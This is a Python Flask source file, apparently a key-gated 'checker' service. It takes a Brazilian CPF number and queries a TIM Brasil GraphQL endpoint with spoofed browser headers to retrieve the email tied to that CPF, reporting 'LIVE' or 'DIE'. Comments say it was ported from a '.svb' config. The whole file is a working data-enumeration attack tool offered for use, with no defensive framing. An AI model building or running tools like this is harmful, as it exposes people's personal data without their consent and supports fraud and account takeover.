from flask import Flask, request, jsonify, render_template
import requests
import re

app = Flask(__name__)

# Carrega chaves válidas
with open('keys.txt') as f:
    VALID_KEYS = {k.strip() for k in f.readlines() if k.strip()}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check', methods=['POST'])
def check_tim():
    # Verificação da chave
    user_key = request.form.get('key')
    if user_key not in VALID_KEYS:
        return jsonify({"error": "Chave inválida"}), 403
    
    # Pegar CPF do formulário
    cpf = request.form.get('cpf')
    if not cpf or len(cpf) != 11:
        return jsonify({"error": "CPF inválido"}), 400

    # Executar a requisição da sua config .svb
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://tanarede.timbrasil.com.br",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0"
    }
    
    payload = {
        "query": """query ConsumerPublicUser($CPF_0: String!) {
            query_0: ConsumerPublicUser(CPF: $CPF_0) {
                email msgWrogEmail firstAccess
            }
        }""",
        "variables": {"CPF_0": cpf}
    }

    try:
        response = requests.post(
            "https://tanarede.timbrasil.com.br/api",
            json=payload,
            headers=headers
        )
        
        data = response.json()
        
        # Verifica se encontrou email (como na sua config)
        if 'email' in str(data):
            email = re.search(r'email":"([^"]+)"', response.text)
            email = email.group(1) if email else "Não encontrado"
            return jsonify({
                "status": "LIVE",
                "email": email
            })
        else:
            return jsonify({"status": "DIE"})
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)